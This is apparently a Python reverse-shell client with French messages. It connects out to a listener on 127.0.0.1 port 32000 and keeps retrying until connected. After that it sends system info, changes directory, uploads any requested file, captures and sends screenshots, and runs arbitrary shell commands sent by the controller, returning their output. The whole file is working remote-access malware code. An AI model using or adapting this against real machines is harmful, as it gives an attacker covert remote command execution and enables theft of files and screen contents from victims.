import socket
import time
import subprocess
import os
import platform
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

while True:
    try:
        s = socket.socket()
        print(f"Connexion a {HOST_IP} port: {HOST_PORT}")
        s.connect((HOST_IP, HOST_PORT))
    except:
        print("Erreur de connexion")
        time.sleep(3)
    else:
        print("Connecter au serveur")
        break



while True:

    commande_data = s.recv(MAX_DATA_SIZE)
    commande = commande_data.decode()
    commande_split = commande.split(" ")
    
    if not commande_data:
        break
    
    if commande == "infos":
        reponse = (platform.platform() + " --- " + os.getcwd()).encode()

    elif len(commande_split) == 2 and commande_split[0] == "cd":
        
        try:
            os.chdir(commande_split[1])
        except FileNotFoundError:
            reponse = "ERREUR ce repertoire n'existe pas".encode()

    elif len(commande_split) > 2 and commande_split[0] == "cd":     # commande cd
        commande_split_refactoriser = ""
        for i in range(len(commande_split)-1):
            commande_split_refactoriser += commande_split[i+1] + " "
        try:
            os.chdir(commande_split_refactoriser)
        except :
            reponse = "ERREUR ce repertoire n'existe pas".encode()
    
    elif len(commande_split) == 2 and commande_split[0] == "dl":        # telechargement
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()

    elif len(commande_split) == 2 and commande_split[0] == "capture":       # capture d'ecran
        nom_capture = commande_split[1]
        capture = ImageGrab.grab()
        capture.save(nom_capture, "PNG")
        try:
            f = open(nom_capture, "rb")
        except:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()


    else:
        resultat = subprocess.run(commande, shell = True, capture_output = True, universal_newlines = True)
        print(commande)
        reponse = (resultat.stdout + resultat.stderr).encode()
    if not reponse or len(reponse) == 0:
        reponse = " ".encode()
    print(reponse)
    header = str(len(reponse)).zfill(13)
    print("header: " + header)
    
    s.send(header.encode())
    
    s.sendall(reponse) 
  
    




s.close()